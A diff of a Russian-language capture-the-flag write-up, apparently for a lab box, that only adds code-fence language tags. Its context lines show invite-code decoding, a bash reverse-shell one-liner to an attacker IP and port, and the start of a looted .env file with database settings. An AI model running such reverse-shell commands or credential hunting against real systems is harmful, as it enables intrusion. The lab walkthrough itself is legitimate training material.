@@ -78,11 +78,11 @@ function registerInviteCode() { /* register + invite_code */ }
 Task 3–4: декодируем `data` из base64 → получаем **ROT13-текст**, который
 указывает на следующий эндпоинт:
 
-```
+```text
 "Va beqre gb ... make a POST request to /api/v1/invite/how/to/generate"
 ```
 
-```
+```bash
 echo "<base64>" | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 ```
 
@@ -154,7 +154,7 @@ echo -n 'bash -i >& /dev/tcp/10.10.17.4/4444 0>&1' | base64
 В webroot (`/var/www/html/`) лежит `.env` (Task 9 — типичное хранилище
 переменных окружения PHP-приложений):
 
-```
+```text
 DB_HOST=localhost
 DB_DATABASE=2million
 DB_USERNAME=admin
